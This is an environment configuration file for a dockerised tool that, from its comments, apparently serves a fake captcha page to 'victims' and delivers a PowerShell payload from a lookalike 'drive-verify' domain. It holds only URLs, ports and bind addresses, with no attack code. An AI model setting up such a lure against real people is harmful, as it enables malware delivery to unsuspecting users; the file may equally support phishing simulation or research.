# Full public-facing URL including port (what victims' browsers will see).
# Used by the SDK, captcha iframe, and PowerShell payload.
# Examples:
#   http://localhost:8080
#   https://drive-verify.example.com
PUBLIC_URL=http://127.0.0.1:8080

# Loopback host ports the apps publish (base docker-compose.yml).
# Point your host nginx (nginx/nginx.conf) at these.
FAKECAPTCHA_PORT=8080
CLIENT_PORT=5000

# Only used with docker-compose.nginx.yml (bundled nginx mode):
#   INTERFACE = host interface/IP to bind (0.0.0.0 = all, 127.0.0.1 = local only)
#   PORT      = public host port exposed by the bundled nginx
INTERFACE=0.0.0.0
PORT=8080
